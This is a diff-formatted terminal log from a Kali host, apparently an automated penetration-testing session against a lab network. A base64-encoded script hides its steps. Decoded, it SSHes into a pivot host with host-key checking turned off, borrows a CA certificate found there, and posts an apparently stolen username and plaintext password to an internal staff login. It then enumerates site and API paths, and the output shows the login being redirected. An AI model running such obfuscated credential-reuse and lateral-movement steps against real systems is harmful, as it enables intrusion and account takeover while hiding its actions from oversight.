@@ -1,0 +1,44 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/s15.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKc2V0ICtlCkNBPS9ob21lL3Jvd2FuLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0Clc9aHR0cHM6Ly9zdGFmZi5rZXBsZXJvcHMudGVzdApjZCAvdG1wOyBybSAtZiB3Yi50eHQKY3VybCAtc1MgLW0gMjAgLS1jYWNlcnQgJENBIC1jIHdiLnR4dCAtYiB3Yi50eHQgLW8gL3RtcC93bC5odG1sICIkVy9sb2dpbiIKVE9LPSQoZ3JlcCAtbyAnbmFtZT0iX3Rva2VuIiB2YWx1ZT0iW14iXSoiJyAvdG1wL3dsLmh0bWwgfCBoZWFkIC0xIHwgc2VkICdzLy4qdmFsdWU9Ii8vO3MvIi8vJykKZWNobyAidG9rZW4gZm91bmQ6ICR7I1RPS30iCmN1cmwgLXNTIC1tIDIwIC0tY2FjZXJ0ICRDQSAtYyB3Yi50eHQgLWIgd2IudHh0IC1MIC1vIC90bXAvd3Bvc3QuaHRtbCAtdyAnbG9naW5wb3N0ICV7aHR0cF9jb2RlfSAle3VybF9lZmZlY3RpdmV9ICV7c2l6ZV9kb3dubG9hZH1cbicgXAogIC0tZGF0YS11cmxlbmNvZGUgIl90b2tlbj0kVE9LIiAtLWRhdGEtdXJsZW5jb2RlICd1c2VybmFtZT1tYXlhLnJhbnNjb21iZScgLS1kYXRhLXVybGVuY29kZSAncGFzc3dvcmQ9c1dRYTMxMDg1RlRRZWtaaEhUeFV5Zl85RTFtYXJxMHVyOFdOQ0ttVHRuaycgIiRXL2xvZ2luIgpncmVwIC1vRSAnPHRpdGxlPltePF0qJyAvdG1wL3dwb3N0Lmh0bWwgfCBoZWFkIC0yCnB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IHJlLGh0bWwKdD1vcGVuKCcvdG1wL3dwb3N0Lmh0bWwnLGVuY29kaW5nPSd1dGY4JyxlcnJvcnM9J3JlcGxhY2UnKS5yZWFkKCkKdHh0PXJlLnN1YihyJzxzY3JpcHQuKj88L3NjcmlwdD4nLCcnLHQsZmxhZ3M9cmUuUyk7IHR4dD1yZS5zdWIocic8c3R5bGUuKj88L3N0eWxlPicsJycsdHh0LGZsYWdzPXJlLlMpCnR4dD1odG1sLnVuZXNjYXBlKHJlLnN1YihyJzxbXj5dKz4nLCcgJyx0eHQpKTsgcHJpbnQocmUuc3ViKHInXHMrJywnICcsdHh0KVs6MTUwMF0pClBZCmVjaG8gIj09PT09IHBhZ2VzID09PT09Igpmb3IgcCBpbiAvIC9oYXJkd2FyZSAvbGljZW5zZXMgL2Fzc2V0cyAvcmV2aWV3cyAvYXBpL3YxL2hhcmR3YXJlIC9hcGkvdjEvbGljZW5zZXM7IGRvIGVjaG8gIiMjICRwIjsgY3VybCAtc1MgLW0gMTUgLS1jYWNlcnQgJENBIC1iIHdiLnR4dCAtbyAvdG1wL3gub3V0IC13ICcle2h0dHBfY29kZX0gJXtjb250ZW50X3R5cGV9ICV7c2l6ZV9kb3dubG9hZH1cbicgIiRXJHAiOyBoZWFkIC1jIDQwMCAvdG1wL3gub3V0OyBlY2hvOyBkb25lCklOTkVSCg==
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/s15.sh; bash /tmp/s15.sh; echo DONEMARK_1795204849013$((6*7))
+token found: 0
+loginpost 200 https://staff.keplerops.test/login 8933
+<title>
+ Login Username * Password * Remember Me Sign in Forgot password? 
+===== pages =====
+## /
+302 text/html; charset=UTF-8 0
+
+## /hardware
+302 text/html; charset=UTF-8 0
+
+## /licenses
+302 text/html; charset=UTF-8 0
+
+## /assets
+301 text/html 162
+<html>
+<head><title>301 Moved Permanently</title></head>
+<body>
+<center><h1>301 Moved Permanently</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+
+## /reviews
+302 text/html; charset=UTF-8 0
+
+## /api/v1/hardware
+404 application/json 22
+{"error":"not_found"}
+
+## /api/v1/licenses
+404 application/json 22
+{"error":"not_found"}
+
